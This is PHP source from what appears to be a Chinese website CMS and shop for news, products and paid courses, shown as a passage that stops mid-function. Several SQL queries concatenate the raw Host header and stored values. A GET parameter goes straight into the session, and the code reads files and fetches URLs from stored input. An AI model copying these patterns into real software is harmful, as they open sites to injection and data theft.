<?php
$dirx=dirname(dirname(__FILE__))."/";
$config=json_decode(file_get_contents($dirx."conn/config.json"));

if(phpversion()<5.4 || phpversion()>7.3){
	die("为保证网站安全，请使用PHP5.4-7.3版本运行本程序！");
}

if(getrs("select * from sl_member where M_id=1")==""){
	die("内置会员被删除导致系统错误，请联系开发人员！");
}

if($config->news==""){
	$news_show="true";
}else{
	$news_show=$config->news;
}

if($config->product==""){
	$product_show="true";
}else{
	$product_show=$config->product;
}

if($config->course==""){
	$course_show="true";
}else{
	$course_show=$config->course;
}

$sql="select * from sl_config";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if(mysqli_num_rows($result) > 0) {
		
		$C_title=$row["C_title"];
		$C_keyword=$row["C_keyword"];
		$C_description=$row["C_description"];
		$C_copyright=$row["C_copyright"];
		$C_code=$row["C_code"];
		$C_logo=$row["C_logo"];
		$C_ico=$row["C_ico"];
		$C_kefu=$row["C_kefu"];
		$C_money=$row["C_money"];
		$C_admin=$row["C_admin"];

		$C_newsds=$row["C_newsds"];
		$C_m_logo=$row["C_m_logo"];
		$C_m_position=$row["C_m_position"];
		$C_m_width=$row["C_m_width"];
		$C_m_height=$row["C_m_height"];
		$C_m_transparent=$row["C_m_transparent"];

		$C_alipaynewid=$row["C_alipaynewid"];
		$C_alipaynewkey=$row["C_alipaynewkey"];
		$C_alipaynewkey2=$row["C_alipaynewkey2"];

		$C_alipay_pid=$row["C_alipay_pid"];
		$C_alipay_pkey=$row["C_alipay_pkey"];
		$C_dmf_id=$row["C_dmf_id"];
		$C_dmf_key=$row["C_dmf_key"];
		$C_dmf_key2=$row["C_dmf_key2"];
		$C_qpay_appid=$row["C_qpay_appid"];
		$C_qpay_mchid=$row["C_qpay_mchid"];
		$C_qpay_key=$row["C_qpay_key"];

		$C_ttpay_mchid=$row["C_ttpay_mchid"];
		$C_ttpay_appid=$row["C_ttpay_appid"];
		$C_ttpay_secret=$row["C_ttpay_secret"];

		$C_freetimes1=$row["C_freetimes1"];
		$C_freetimes2=$row["C_freetimes2"];
		$C_freetimes3=$row["C_freetimes3"];

		$C_7pay_pid=$row["C_7pay_pid"];
		$C_7pay_pkey=$row["C_7pay_pkey"];
		$C_codepay_id=$row["C_codepay_id"];
		$C_codepay_key=$row["C_codepay_key"];
		$C_codepay_type=$row["C_codepay_type"];
		$C_jipay_id=$row["C_jipay_id"];
		$C_jipay_key=$row["C_jipay_key"];
		$C_jipay_type=$row["C_jipay_type"];
		$C_hupay_id=$row["C_hupay_id"];
		$C_hupay_key=$row["C_hupay_key"];
		$C_hupay_id2=$row["C_hupay_id2"];
		$C_hupay_key2=$row["C_hupay_key2"];
		$C_hupay_type=$row["C_hupay_type"];
		$C_epay_url=$row["C_epay_url"];
		$C_epay_id=$row["C_epay_id"];
		$C_epay_key=$row["C_epay_key"];
		$C_epay_type=$row["C_epay_type"];
		$C_payjs_id=$row["C_payjs_id"];
		$C_payjs_key=$row["C_payjs_key"];
		$C_payjs_id2=$row["C_payjs_id2"];
		$C_payjs_key2=$row["C_payjs_key2"];
		$C_payjs_type=$row["C_payjs_type"];
		$C_wx_appid=$row["C_wx_appid"];
		$C_wx_appsecret=$row["C_wx_appsecret"];
		$C_wx_mchid=$row["C_wx_mchid"];
		$C_wx_key=$row["C_wx_key"];
		$C_qqid=$row["C_qqid"];
		$C_qqkey=$row["C_qqkey"];

		$C_alicode=$row["C_alicode"];
		$C_wxcode=$row["C_wxcode"];
		$C_kd=$row["C_kd"];

		$C_postage=$row["C_postage"];
		$C_baoyou=$row["C_baoyou"];

		$C_osson=$row["C_osson"];
		$C_oss_id=$row["C_oss_id"];
		$C_oss_key=$row["C_oss_key"];
		$C_oss_domain=$row["C_oss_domain"];
		$C_bucket=$row["C_bucket"];
		$C_region=$row["C_region"];

		$C_buylimit=$row["C_buylimit"];
		$C_viplimit=$row["C_viplimit"];

		$C_wxapp_id=$row["C_wxapp_id"];
		$C_wxapp_key=$row["C_wxapp_key"];
		$C_aliapp_id=$row["C_aliapp_id"];
		$C_aliapp_key=$row["C_aliapp_key"];
		$C_aliapp_key2=$row["C_aliapp_key2"];
		$C_bdapp_id=$row["C_bdapp_id"];
		$C_bdapp_key=$row["C_bdapp_key"];
		$C_bdapp_key2=$row["C_bdapp_key2"];
		$C_qqapp_id=$row["C_qqapp_id"];
		$C_qqapp_key=$row["C_qqapp_key"];
		$C_zjapp_id=$row["C_zjapp_id"];
		$C_zjapp_key=$row["C_zjapp_key"];

		$C_appt=$row["C_appt"];
		$C_bond=$row["C_bond"];

		$C_alipayon=$row["C_alipayon"];
		$C_alipaynewon=$row["C_alipaynewon"];
		$C_wxpayon=$row["C_wxpayon"];
		$C_7payon=$row["C_7payon"];
		$C_qpayon=$row["C_qpayon"];
		$C_dmfon=$row["C_dmfon"];
		$C_codepayon=$row["C_codepayon"];
		
		$C_alicodeon=$row["C_alicodeon"];
		$C_wxcodeon=$row["C_wxcodeon"];

		$C_kefuon=$row["C_kefuon"];
		$C_regon=$row["C_regon"];
		$C_qqon=$row["C_qqon"];
		$C_wxon=$row["C_wxon"];
		$C_qqon2=$row["C_qqon2"];
		$C_wxon2=$row["C_wxon2"];
		$C_dxon=$row["C_dxon"];
		$C_rzon=$row["C_rzon"];
		$C_fee=$row["C_fee"];
		$C_rzfee=$row["C_rzfee"];
		$C_rzfeetype=$row["C_rzfeetype"];
		$C_bondtype=$row["C_bondtype"];
		$C_zd=$row["C_zd"];

		$C_fzon=$row["C_fzon"];
		$C_fzk=$row["C_fzk"];
		$C_zzk=$row["C_zzk"];
		$C_fzvip=$row["C_fzvip"];

		$C_punsh=$row["C_punsh"];
		$C_nunsh=$row["C_nunsh"];

		$C_vip1=$row["C_vip1"];
		$C_vip2=$row["C_vip2"];
		$C_vip3=$row["C_vip3"];
		$C_vip6=$row["C_vip6"];
		$C_vip12=$row["C_vip12"];
		$C_vip0=$row["C_vip0"];
		$C_p_discount=$row["C_p_discount"];
		$C_n_discount=$row["C_n_discount"];
		$C_p_discount2=$row["C_p_discount2"];
		$C_n_discount2=$row["C_n_discount2"];
		$C_c_discount=$row["C_c_discount"];
		$C_c_discount2=$row["C_c_discount2"];

		$C_template=$row["C_template"];
		$C_wap=$row["C_wap"];
		$C_beian=$row["C_beian"];
		$C_qrcode=$row["C_qrcode"];
		$C_email=$row["C_email"];
		$C_phone=$row["C_phone"];
		$C_regr=$row["C_regr"];

		$C_authcode=$row["C_authcode"];
		$C_notice=$row["C_notice"];

		$C_mailtype=$row["C_mailtype"];
		$C_mailcode=$row["C_mailcode"];
		$C_smtp=$row["C_smtp"];
		$C_html=$row["C_html"];

		$C_fx1=$row["C_fx1"];
		$C_fx2=$row["C_fx2"];
		$C_fx3=$row["C_fx3"];

		$C_fen1=$row["C_fen1"];
		$C_fen2=$row["C_fen2"];
		$C_fen3=$row["C_fen3"];

		$C_dx1=$row["C_dx1"];
		$C_dx2=$row["C_dx2"];
		$C_dx3=$row["C_dx3"];
		$C_dx4=$row["C_dx4"];
		$C_dx5=$row["C_dx5"];

		$C_memberon=$row["C_memberon"];
		$C_pwdcode=$row["C_pwdcode"];

		$C_mobile=$row["C_mobile"];
    	$C_smssign=$row["C_smssign"];
    	$C_userid=$row["C_userid"];
    	$C_codeid=$row["C_codeid"];
    	$C_codekey=$row["C_codekey"];

		$C_twice=$row["C_twice"];
		$C_uncopy=$row["C_uncopy"];
		$C_slide=$row["C_slide"];
		$C_backup=$row["C_backup"];
		$C_format=$row["C_format"];
		$C_bd_token=$row["C_bd_token"];

		$C_hotwords=$row["C_hotwords"];
		$C_fdomain=$row["C_fdomain"];
		$C_cache=0;
		$C_reuseid=$row["C_reuseid"];

		$C_paypalon=$row["C_paypalon"];
		$C_paypal=$row["C_paypal"];
		$C_rate=$row["C_rate"];

		$C_contact=getrs("select T_content from sl_text where T_del=0 and T_type=1","T_content");

		$C_domain=$_SERVER['HTTP_HOST'];
		$H_data=$row;
		$H_data["C_contact"]=$C_contact;
	}

	if(www($_SERVER['HTTP_HOST'])!=www($C_fdomain) && $C_fdomain!=""){//分站域名访问
		$M=getrs("select * from sl_member where concat(';',M_domain,';') like '%;".$_SERVER['HTTP_HOST'].";%'");
		if($M!=""){//使用绑定的域名
			$fmid=intval($M["M_id"]);
		}else{
			if(strpos($_SERVER['HTTP_HOST'],www($C_fdomain))!==false){//使用自带的域名
				$fmid=intval(splitx($_SERVER['HTTP_HOST'],".",0));
			}else{
				$fmid=0;
			}
		}

		$sql="select * from sl_member where M_id=".$fmid;
		$result = mysqli_query($conn, $sql);
		if (mysqli_num_rows($result) > 0) {
			$row = mysqli_fetch_assoc($result);
			$M_sellertime=$row["M_sellertime"];
			$M_sellerlong=$row["M_sellerlong"];
			$M_show=$row["M_show"];
			$M_product=$row["M_product"];
			$M_news=$row["M_news"];

			if(time()-strtotime($M_sellertime)>$M_sellerlong*86400 && $C_fzk==1){//商家到期
				die("该用户未开通分站功能");
			}else{
				if($row["M_webtitle"]!=""){
					$C_title=$row["M_webtitle"];
					$H_data["C_title"]=$row["M_webtitle"];
				}
				if($row["M_keyword"]!=""){
					$C_keyword=$row["M_keyword"];
					$H_data["C_keyword"]=$row["M_keyword"];
				}
				if($row["M_description"]!=""){
					$C_description=$row["M_description"];
					$H_data["C_description"]=$row["M_description"];
				}
				if($row["M_logo"]!=""){
					$C_logo=$row["M_logo"];
					$H_data["C_logo"]=$row["M_logo"];
				}
				if($row["M_ico"]!=""){
					$C_ico=$row["M_ico"];
					$H_data["C_ico"]=$row["M_ico"];
				}
				if($row["M_qrcode"]!=""){
					$C_qrcode=$row["M_qrcode"];
					$H_data["C_qrcode"]=$row["M_qrcode"];
				}
				if($row["M_beian"]!=""){
					$C_beian=$row["M_beian"];
					$H_data["C_beian"]=$row["M_beian"];
				}
				if($row["M_copyright"]!=""){
					$C_copyright=$row["M_copyright"];
					$H_data["C_copyright"]=$row["M_copyright"];
				}
				if($row["M_mobile"]!=""){
					$C_phone=$row["M_mobile"];
					$H_data["C_phone"]=$row["M_mobile"];
				}
				if($row["M_notice"]!=""){
					$C_notice=$row["M_notice"];
					$H_data["C_notice"]=$row["M_notice"];
				}
				if($row["M_contact"]!=""){
					$C_contact=$row["M_contact"];
					$H_data["C_contact"]=$row["M_contact"];
				}
				if($row["M_code"]!=""){
					$C_code=$row["M_code"];
					$H_data["C_code"]=$row["M_code"];
				}
				if($row["M_kefu"]!=""){
					$C_kefu=$row["M_kefu"];
					$H_data["C_kefu"]=$row["M_kefu"];
				}
				
				if($row["M_template"]!=""){
					$C_template=$row["M_template"];
					$H_data["C_template"]=$row["M_template"];
				}
				if($row["M_wap"]!=""){
					$C_wap=$row["M_wap"];
					$H_data["C_wap"]=$row["M_wap"];
				}

				$priceup=1+$row["M_priceup"]/100;
				if($M_show==1){
					$M_ninfo=" and (N_mid=$fmid or instr('".$M_news."',CONCAT('|',N_id,'|'))>0)";
					$M_pinfo=" and (P_mid=$fmid or instr('".$M_product."',CONCAT('|',P_id,'|'))>0)";
				}else{
					$M_ninfo=" and N_mid=0 ";
					$M_pinfo=" and P_mid=0 ";
				}
			}
		}else{
			//die("该域名[".$_SERVER['HTTP_HOST']."]尚未绑定");
			$priceup=1;
			$fmid=0;
			if($C_zzk==1){
				$M_ninfo=" and N_mid=0 ";
				$M_pinfo=" and P_mid=0 ";
			}else{
				$M_ninfo="";
				$M_pinfo="";
			}
		}
	}else{
		$priceup=1;
		$fmid=0;
		if($C_zzk==1){
			$M_ninfo=" and N_mid=0 ";
			$M_pinfo=" and P_mid=0 ";
		}else{
			$M_ninfo="";
			$M_pinfo="";
		}
	}

if(strpos(strtolower($_SERVER['PHP_SELF']),"api/alipay/notify_url.php")===false && strpos(strtolower($_SERVER['PHP_SELF']),"pay/dmf/notify_url.php")===false && strpos(strtolower($_SERVER['PHP_SELF']),"tpl_edit.php")===false){
	$_POST = array_map('check_input', $_POST);
}

if($_GET["uid"]!=""){
	$_SESSION["uid"]=$_GET["uid"];
}

function p($price){
	global $priceup,$M_show;
	if(is_numeric($price)){
		if($M_show==1){
			return round($price,2);
		}else{
			return round($price*$priceup,2);
		}
	}else{
		return $price;
	}
}

function downpic($path,$url){
global $C_osson;
$name=date("YmdHis").gen_key(3).".jpg";
if(substr($url,0,2)=="//"){
    $url="http:".$url;
}
$url = getbody(str_replace("https://","http://",$url),"","GET");
file_put_contents($path.$name,$url);
if($C_osson==1){
	tooss("../media/".$name);
}
return $name;
}

function check_input($value){
	if (is_array($value)){
		return $value;
	}else{
		return addslashes($value);
	}
}

function text($t){
	global $conn,$id,$C_kefu,$C_keyword,$C_description,$fmid,$C_contact;
	$sql="select * from sl_text where T_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[T_title]",$row["T_title"],$t);
		$t = str_Replace("[T_pic]",pic($row["T_pic"]),$t);
		$t = str_Replace("[T_order]",$row["T_order"],$t);
		if($row["T_keywords"]==""){//如果单页关键词为空，则调用网站关键词
			$t = str_Replace("[T_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[T_keywords]",$row["T_keywords"],$t);
		}
		if($row["T_description"]==""){//如果单页描述为空，则调用网站描述
			$t = str_Replace("[T_description]",$C_description,$t);
		}else{
			$t = str_Replace("[T_description]",$row["T_description"],$t);
		}

		switch($row["T_type"]){
			case 0:
			case 5:
			$T_content=$row["T_content"];
			break;

			case 1:
			$kf=explode("|",$C_kefu);
			for($i=0;$i<count($kf);$i++){
				switch(splitx($kf[$i],"_",1)){
					case "qq":
					$type="QQ";
					$url="http://wpa.qq.com/msgrd?v=3&uin=".splitx($kf[$i],"_",0)."&site=qq&menu=yes";
					break;
					case "ww":
					$type="旺旺";
					$url="http://www.taobao.com/webww/ww.php?ver=3&touid=".splitx($kf[$i],"_",0)."&siteid=cntaobao&status=1&charset=utf-8";
					break;
					case "wx":
					$type="微信";
					$url="javascript:;";
					break;
					case "phone":
					$type="电话";
					$url="tel:".splitx($kf[$i],"_",0);
					break;
					case "email":
					$type="邮箱";
					$url="mailto:".splitx($kf[$i],"_",0);
					break;
				}
				$kefu=$kefu."<b>".splitx($kf[$i],"_",2)."</b> <a href=\"".$url."\">".$type."：".splitx($kf[$i],"_",0)."</a><br>";
			}
			if($fmid==0){
				if($row["T_mapshow"]==1){
					$T_content="<iframe src=\"conn/mapload.php?C_address=".$row["T_address"]."&C_zb=".$row["T_zb"]."\" scrolling=\"no\" name=\"mapif\" type=\"1\" frameborder=\"0\" height=\"400\" width=\"100%\" style=\"margin: 20px 0\"></iframe><p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$row["T_content"]."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";
				}else{
					$T_content="<p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$row["T_content"]."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";
				}
				
			}else{
				$T_content="<p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$C_contact."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";

			}
			break;

			case 2:
			$T_content=$row["T_content"].'<link href="css/form.css" rel="stylesheet">
<div class="form_container">
<form action="booksave.php?action=save" method="post">
<div class="right"><input type="text" name="G_title" placeholder="留言标题"></div>
<div class="right"><input type="text" name="G_name" placeholder="您的姓名"></div>
<div class="right"><input type="text" name="G_phone" placeholder="联系电话"></div>
<div class="right"><input type="text" name="G_mail" placeholder="电子邮箱"></div>
<div class="right"><textarea name="G_msg" placeholder="留言内容"></textarea></div>
<div class="right">'.calculation('G_code').'</div>
<div class="right"><button type="submit">提交留言</button><button type="reset">重新填写</button></div>
</form>
</div>';
			break;
			case 3:
			$sql="select Q_title,Q_order from (select * from sl_quan where Q_del=0 and Q_hide=0 and Q_gettime>now())b group by Q_title,Q_order order by Q_order asc";
			$result = mysqli_query($conn, $sql);
			if (mysqli_num_rows($result) > 0) {
				while($row = mysqli_fetch_assoc($result)) {
					$Q=getrs("select * from sl_quan where Q_title='".$row["Q_title"]."'");
					$rest=getrs("select count(Q_id) as Q_count from sl_quan where Q_del=0 and Q_hide=0 and Q_mid=0 and Q_gettime>now() and Q_title='".$Q["Q_title"]."'","Q_count");

					if($Q["Q_pid"]>0){
						$P_info="".getrs("select * from sl_product where P_id=".$Q["Q_pid"],"P_title")."";
					}else{
						$P_info="店铺优惠券";
					}

					if($Q["Q_discount"]>0){
						$D_info=" 打".((100-$Q["Q_discount"])/10)."折";
						$D_info2=((100-$Q["Q_discount"])/10)."折";
					}else{
						$D_info="";
						$D_info2="";
					}

					if($Q["Q_minuse"]>0){
						$M_info=" 减".$Q["Q_minuse"]."元";
						$M_info2="￥".$Q["Q_minuse"];
					}else{
						$M_info="";
						$M_info2="";
					}
					if($_SESSION["M_id"]!="" && getrs("select * from sl_quan where Q_mid=".intval($_SESSION["M_id"])." and Q_title='".$Q["Q_title"]."'")){
						$btn="<div class=\"quan_get\">已领取</div>";
						$info="您已领取该优惠券，请在".date("Y-m-d",strtotime($Q["Q_usetime"]))."前使用";
					}else{
						if($rest>0){
							$btn="<div class=\"quan_btn\" onclick=\"getquan(".$Q["Q_id"].")\">立即领取</div>";
							$info="优惠券仅剩".$rest."张，请尽快领取！";
						}else{
							$btn="<div class=\"quan_get\">已抢光</div>";
							$info="该优惠券已被抢光，下次早点来哦！";
						}
					}

					$quan=$quan."<div class=\"quan_box\">
					<div class=\"quan_bg\">券</div>
					
					<div style=\"float:right;text-align:right;margin-top:10px\">
					<b>".$Q["Q_title"]."</b><br>满".$Q["Q_money"]."元".$M_info.$D_info."
					</div>
					<div class=\"quan_dis\">".$D_info2.$M_info2."</div>
					<div class=\"quan_info\">$P_info</div>
					<div class=\"\">".date("Y-m-d",strtotime($Q["Q_gettime"]))."前领取 / ".date("Y-m-d",strtotime($Q["Q_usetime"]))."前使用</div>
					".$btn."
					<div style=\"text-align:center;margin-top:5px;\">".$info."<span id=\"login_".$Q["Q_id"]."\"></span></div>
					
					</div>";
				}
			}
			$js='<script>
			function getquan(id){
				$.ajax({
		            url: "conn/f.php?action=getquan&Q_id="+id,
		            success: function(data) {
		                data = JSON.parse(data);
		                if (data.code == "success") {
		                    location.reload();
		                } else {
		                    alert(data.msg);
		                    if(data.msg=="请先登录会员帐号！"){
		                    	$("#login_"+id).html(" <a style=\'color:#fff\' href=\'member/login.php?from="+encodeURIComponent(window.location.href)+"\'>[登录帐号]</a>");
		                    }
		                }
		            }
		        });
			}
			</script>';
			$css="<style>
			@media screen and (max-width:1024px){
			.quan_box{display:inline-block;width:calc(100% - 20px);margin:10px;vertical-align:top;border-radius:10px;padding:10px;background-image: linear-gradient(to left, #FF7A0C,#FF2A14);color:#fff;font-size:12px;position:relative;overflow:hidden}
			}
			@media screen and (min-width:1024px){
			.quan_box{display:inline-block;width:calc(33% - 40px);margin:10px;vertical-align:top;border-radius:10px;padding:10px;background-image: linear-gradient(to left, #FF7A0C,#FF2A14);color:#fff;font-size:12px;position:relative;overflow:hidden}
			}
			.quan_btn{height:30px;line-height:30px;background:#FFF577;border-radius:30px;text-align:center;color:#FF0000;margin-top:10px;cursor:pointer}
			.quan_get{height:30px;line-height:30px;background:#EEE;border-radius:30px;text-align:center;color:#666;margin-top:10px;cursor:pointer}
			.quan_dis{font-size:40px;line-height:70px;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;word-break: break-all;}
			.quan_info{white-space: nowrap;text-overflow: ellipsis;overflow: hidden;word-break: break-all;font-weight:bold}
			.quan_bg{color:#FFF577;font-size:100px;border:solid 8px #FFF577;border-radius:100%;width:180px;height:180px;text-align:center;position:absolute;right:-50px;top:-50px;opacity:0.1;z-index:1;user-select:none}
			</style>";
			$T_content=$css.$js.$quan;

			break;
			case 4:
			$T_content="<iframe src='member/query.php' marginheight='0' marginwidth='0' frameborder='0' scrolling='no' width='100%' height='100%' id='iframepage' name='iframepage' onLoad='iFrameHeight()' style='width:100%;max-width:900px;min-height:560px'></iframe>
<script type='text/javascript' language='javascript'>
function iFrameHeight() {
    var ifm= document.getElementById('iframepage');
    var subWeb = document.frames ? document.frames['iframepage'].document :ifm.contentDocument;
    if(ifm != null && subWeb != null){
        ifm.height = subWeb.body.scrollHeight;
        ifm.style.height= subWeb.body.scrollHeight+'px';
    }
}
window.timer = setInterval('iFrameHeight()', 500);
</script>";
			break;
		}
		$t = str_Replace("[T_content]",editor_oss($T_content),$t);
	}
	return $t;
}

function news($t){
	global $conn,$id,$C_keyword,$C_description;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_nsort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",pic($row["S_pic"]),$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		if($row["S_content"]==""){
			$t = str_Replace("[S_content]",$C_description,$t);
		}else{
			$t = str_Replace("[S_content]",$row["S_content"],$t);
		}
		if($row["S_keywords"]==""){
			$t = str_Replace("[S_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[S_keywords]",$row["S_keywords"],$t);
		}
	}else{
		if(intval($M_id)>0){
			$M=getrs("select * from sl_member where M_id=$M_id");
			$M_shop=$M["M_shop"];
			$M_head=$M["M_head"];
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_keywords]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]",pic($M_head),$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部文章",$t);
			$t = str_Replace("[S_keywords]","全部文章",$t);
			$t = str_Replace("[S_content]","ALL NEWS",$t);
			$t = str_Replace("[S_pic]",pic("nopic.png"),$t);
		}
		
	}
	return $t;
}



function course($t){
	global $conn,$id,$C_keyword,$C_description;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_usort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",pic($row["S_pic"]),$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		if($row["S_content"]==""){
			$t = str_Replace("[S_content]",$C_description,$t);
		}else{
			$t = str_Replace("[S_content]",$row["S_content"],$t);
		}
		if($row["S_keywords"]==""){
			$t = str_Replace("[S_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[S_keywords]",$row["S_keywords"],$t);
		}
	}else{
		if(intval($M_id)>0){
			$M=getrs("select * from sl_member where M_id=$M_id");
			$M_shop=$M["M_shop"];
			$M_head=$M["M_head"];
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_keywords]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]",pic($M_head),$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部课程",$t);
			$t = str_Replace("[S_keywords]","全部课程",$t);
			$t = str_Replace("[S_content]","ALL COURSE",$t);
			$t = str_Replace("[S_pic]",pic("nopic.png"),$t);
		}
		
	}
	return $t;
}

function c_video($id,$page){
	global $conn,$C_c_discount,$C_c_discount2,$C_keyword,$C_description;
	if($page==0){
		$page=1;
	}

	if($_SESSION["M_id"]!=""){
	  $H_id=getrs("select * from sl_history where H_hid=$id and H_mid=".$_SESSION["M_id"]." and H_type=2","H_id");
	  if($H_id!=""){
	      mysqli_query($conn,"update sl_history set H_hid2=$page,H_time='".date('Y-m-d H:i:s')."' where H_id=$H_id");
	  }else{
	      mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_hid2,H_mid,H_time) values(2,$id,$page,".$_SESSION["M_id"].",'".date('Y-m-d H:i:s')."')");
	  }
	}

	$genkey=date('YmdHis').rand(1000,9999);
	
	$sql="select * from sl_course,sl_usort where C_sort=S_id and C_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$C_price=$row["C_price"];

		$lession=explode("||",$row["C_lesson"]);
		for($i=0;$i<count($lession);$i++){
			if(strpos($lession[$i],"_")!==false){
				$l=$l.$lession[$i]."||";
			}
		}

		$ptitle=splitx(splitx($l,"||",($page-1)),"__",0);
		$price=splitx(splitx($l,"||",($page-1)),"__",1);
		$video=splitx(splitx($l,"||",($page-1)),"__",2);

		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[C_title]",$row["C_title"],$t);
		$t = str_Replace("[C_ptitle]",$ptitle." - ".$row["C_title"],$t);
		$t = str_Replace("[C_pic]",pic($row["C_pic"]),$t);
		$t = str_Replace("[C_price]",$row["C_price"],$t);
		$style="<style>
		.u{height:100%;width:100%;min-height:250px;position:relative;background:#f7f7f7;display:block;}
		.u div{height:220px;width:300px;text-align:center;top:calc(50% - 110px);position:absolute;left:calc(50% - 150px);}
		</style>
		
		";

		if(substr($video,0,7)=="<iframe"){
			$v=$video;
		}else{
			if(substr($video,0,6)=="media/" || substr($video,0,7)=="http://" || substr($video,0,8)=="https://"){
				//无需加前缀
			}else{
				$video="media/".$video;
			}
			switch(substr(strrchr(splitx($video,"?",0), '.'), 1)){
				case "txt":
				$v="<div style=\"text-align:left;background:#fff;padding:10px;box-shadow: 0px 0px 10px #666666;height:100%;overflow:auto;width:100%\">".str_replace("\r\n","<br>",file_get_contents("../".$video))."</div>";
				break;

				case "mp3":
				$v="<div id=\"dplayer\" style=\"width: 100%;height: 100%\"></div>
					<script>const dp = new DPlayer({
					    container: document.getElementById('dplayer'),
					    video: {
					        url: '".$video."',
					        pic: 'media/".$row["C_pic"]."',
					    },
					});</script>";
				break;
				case "m3u8":
				$v="<div id=\"dplayer\" style=\"width: 100%;height: 100%\"></div>
					<script>const dp = new DPlayer({
					    container: document.getElementById('dplayer'),
					    video: {
					        url: '".$video."',
					        type: 'hls',
					    },
					});</script>";
				break;
				case "mp4":
				case "mkv":
				$v="<div id=\"dplayer\" style=\"width: 100%;height: 100%\"></div>
					<script>const dp = new DPlayer({
					    container: document.getElementById('dplayer'),
					    video: {
					        url: '".$video."',
					    },
					});</script>";
				break;
				default:
				$v="<div id=\"dplayer\" style=\"width: 100%;height: 100%\"></div>
					<script>const dp = new DPlayer({
					    container: document.getElementById('dplayer'),
					    video: {
					        url: '".$video."',
					    },
					});</script>";
				break;
			}
		}

		$M=getrs("select * from sl_member where M_id=".intval($_SESSION["M_id"]));
		if($M!=""){
			$M_viptime=$M["M_viptime"];
			$M_viplong=$M["M_viplong"];
			if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
				if($M_viplong>30000){
					$C_discount=$C_c_discount2/10;
				}else{
					$C_discount=$C_c_discount/10;
				}
			}else{
				$C_discount=1;
			}
		}else{
			$C_discount=1;
		}

		if($price>0 && $C_price>0){//付费
			if($M==""){//未登录
				$x="<div class=\"u\"><div><p><img src=\"images/v_nologin.png\"></p><p>亲，需要登录才能继续观看～
 </p><p><a href=\"member/login.php?from=".urlencode("../?type=courseinfo&id=".$id."&page=".$page)."\" class=\"btn btn-info\">快速登录</a></p></div></div>";
			}else{
				$O=getrs("select * from sl_orders where O_cid=$id and O_state=1 and (O_content='all' or O_content='".$page."') and O_mid=".intval($_SESSION["M_id"]));
				if($O==""){
					$x="<div class=\"u\"><div><p><img src=\"images/v_nologin.png\"></p><p>亲，需要购买才能继续观看～
 </p><p><a href=\"buy.php?type=courseinfo&id=$id&page=all&genkey=$genkey\" class=\"btn btn-primary\">".($C_price*$C_discount)."元购买全套</a> <a href=\"buy.php?type=courseinfo&id=$id&page=$page&genkey=$genkey\" class=\"btn btn-info\">".($price*$C_discount)."元购买本节</a></p></div></div>";
				}else{
					$x=$v;
				}
			}
		}else{
			$x=$v;
		}

		$arr=array();
		$arr["video"]=$style.$x;
		$arr["title"]=$ptitle." - ".$row["C_title"];
		return $arr;
	}
}

function courseintro($t){
	global $conn,$id,$C_c_discount,$C_c_discount2,$C_keyword,$C_description;
	$sql="select * from sl_course,sl_usort where C_sort=S_id and C_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[C_id]",$row["C_id"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[C_title]",$row["C_title"],$t);
		$t = str_Replace("[C_content]",$row["C_content"],$t);
		$t = str_Replace("[C_pic]",pic($row["C_pic"]),$t);
		$t = str_Replace("[C_price]",$row["C_price"],$t);

		if($C_c_discount<10){//普通VIP有折扣
			$s="<span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">VIP￥<span id=\"price_v1\">".p($row["C_price"]*$C_c_discount/10)."</span></span>";
		}
		if($C_c_discount2<$C_c_discount){
